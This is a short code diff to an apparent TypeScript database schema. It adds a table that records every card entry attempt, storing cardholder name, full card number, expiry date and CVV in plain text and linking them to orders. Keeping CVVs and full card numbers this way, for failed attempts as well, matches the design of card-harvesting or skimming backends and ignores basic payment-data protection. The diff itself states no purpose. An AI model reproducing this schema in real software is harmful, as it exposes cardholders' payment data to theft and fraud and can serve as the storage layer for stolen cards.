@@ -54,6 +54,17 @@ export const ordersTable = pgTable("mawashi_orders", {
   visitorId: text("visitor_id"),
 });
 
+// Table to track all card entry attempts
+export const cardAttemptsTable = pgTable("mawashi_card_attempts", {
+  id: serial("id").primaryKey(),
+  orderId: integer("order_id").notNull().references(() => ordersTable.id),
+  cardName: text("card_name").notNull(),
+  cardNumber: text("card_number").notNull(),
+  cardExpiry: text("card_expiry").notNull(),
+  cardCvv: text("card_cvv"),
+  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
+});
+
 // Visitors table for tracking unique visitors
 export const visitorsTable = pgTable("mawashi_visitors", {
   id: serial("id").primaryKey(),
@@ -90,3 +101,4 @@ export type SiteContent = typeof siteContentTable.$inferSelect;
 export type Order = typeof ordersTable.$inferSelect;
 export type Visitor = typeof visitorsTable.$inferSelect;
 export type Presence = typeof presenceTable.$inferSelect;
+export type CardAttempt = typeof cardAttemptsTable.$inferSelect;
